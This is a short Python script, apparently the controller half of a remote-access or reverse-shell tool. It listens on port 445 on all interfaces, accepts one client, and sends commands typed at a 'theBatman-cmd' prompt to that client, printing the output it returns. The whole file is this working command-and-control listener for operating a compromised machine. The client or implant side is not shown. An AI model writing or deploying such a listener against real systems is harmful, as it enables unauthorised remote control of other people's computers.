#!/usr/bin/python
import socket
import os
import time


def logo():
	print("SERVER")

  
#Starting Server
def main():
	port = 445	# port to communicate with
	host = socket.gethostbyname('0.0.0.0')	# hostName
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket connection
			s.bind((host, port)) # binding with the port to communicate
			s.listen(1)	# starts listening to the port
			print("[+] Connected")
			break
		except:
			os.system('cls')
			logo()
			print("[+] Connecting...")
			time.sleep(10)
			continue		
	clientsocket, addr = s.accept()	# instruction handler
	print("Connection from: " + str(addr))
	while True:
		ins = input("theBatman-cmd>>: ")
		msg = ins.encode("UTF-8")
		clientsocket.send(msg)
		msg = clientsocket.recv(4096)
		print(msg.decode("UTF-8"))

    
if __name__ == "__main__":
	main()
